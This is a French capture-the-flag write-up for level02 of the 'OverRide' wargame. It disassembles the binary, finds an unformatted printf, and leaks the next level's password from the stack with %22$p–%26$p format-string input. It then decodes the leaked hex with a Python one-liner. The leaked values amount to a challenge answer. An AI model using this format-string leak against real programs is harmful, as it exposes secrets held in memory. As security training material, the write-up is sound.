## Level 02

### Analyse
L'analyse du binaire révèle une vulnérabilité de type Format String dans la fonction main. Le programme lit un nom d'utilisateur et l'affiche directement via printf sans spécificateur de format, nous permettant de lire la mémoire de la pile où est stocké le mot de passe du niveau suivant.

La faille se trouve à la fin du programme, où notre input est affiché directement:
```bash
$gdb ./level02
disas main
.....
0x0000000000400aa2 <+654>:    callq  0x4006c0 <printf@plt>
....

x/s 0x400cd9
```
L'argument passé à printf est l'adresse -0x70(%rbp), qui contient notre nom d'utilisateur. Comme aucun format (ex: %s) n'est spécifié, nous pouvons injecter des opérateurs de format.

En analysant la stack, on identifie les emplacements des variables clés :

1. 0xa0(%rbp) : Le mot de passe lu depuis le fichier (fread à +234).

2. 0x70(%rbp) : Notre input "Username" (fgets à +453).

3. 0x110(%rbp) : Notre input "Password" (fgets à +523).


### Exploitation

On calcule l'offset pour atteindre le mot de passe (-0xa0(%rbp)). La différence entre notre input (-0x70) et le mot de passe (-0xa0) est de 48 octets en mémoire. En architecture 64-bits, cela correspond à 6 registres/slots de stack ($48 / 8 = 6$).

On trouve l'offset via une fuite de mémoire :
```bash
level02@OverRide:~$ ./level02
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: pelo
...
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

On convertit les valeurs hexadécimales obtenues. Comme la machine est en Little Endian, il faut inverser les octets de chaque bloc pour reconstruire la chaîne ASCII.

```bash
python -c "print ''.join([v.decode('hex')[::-1] for v in ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']])"
```
